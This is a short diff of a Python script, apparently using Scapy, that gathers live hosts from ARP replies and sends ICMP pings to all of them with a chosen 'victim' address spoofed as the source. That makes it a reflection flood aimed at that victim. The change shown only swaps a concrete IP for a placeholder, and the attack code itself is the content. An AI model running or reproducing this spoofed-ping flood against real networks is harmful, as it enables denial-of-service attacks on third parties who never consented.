@@ -27,7 +27,7 @@ for pkt in ans:
 	pingables.append(pkt[1][ARP].psrc)
 #now we have to pick a victim and send from him pings to all the pingables 
 #make sure to exclude the victim from the list
-victim='10.0.0.31'
+victim='victim`s IP'
 send(IP(src=victim,dst=pingables)/ICMP())
 
 
